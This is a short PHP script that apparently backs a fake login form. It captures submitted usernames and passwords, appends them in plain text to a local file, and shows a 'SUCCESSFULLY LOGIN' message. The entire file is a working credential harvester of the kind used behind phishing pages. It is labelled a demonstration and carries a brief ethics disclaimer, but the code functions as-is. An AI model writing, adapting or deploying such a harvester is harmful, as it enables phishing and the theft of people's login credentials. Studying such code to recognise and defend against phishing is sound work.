<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture the username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Sanitize the captured data to prevent XSS attacks
    $sanitized_username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    $sanitized_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

     // Log the captured data to a file for demonstration purposes
     $log_file = 'captured_data.txt';
     $log_data = "Username: " . $sanitized_username . "\nPassword: " . $sanitized_password . "\n\n";
     file_put_contents($log_file, $log_data, FILE_APPEND);
 

    // Display the captured and sanitized data for demonstration purposes
   
    echo "<h1> SUCCESSFULLY LOGIN : (Captured Data) </h1>";
    // echo "<p>Username: " . $sanitized_username . "</p>";
    // echo "<p>Password: " . $sanitized_password . "</p>";

    // Emphasize the importance of using this knowledge ethically
    echo "<p><strong>Note:</strong> This demonstration shows how data can be captured through a form. Always use such knowledge ethically and never attempt to misuse or exploit personal information.</p>";
} else {
    echo "<p>Invalid request method.</p>";
}
?>
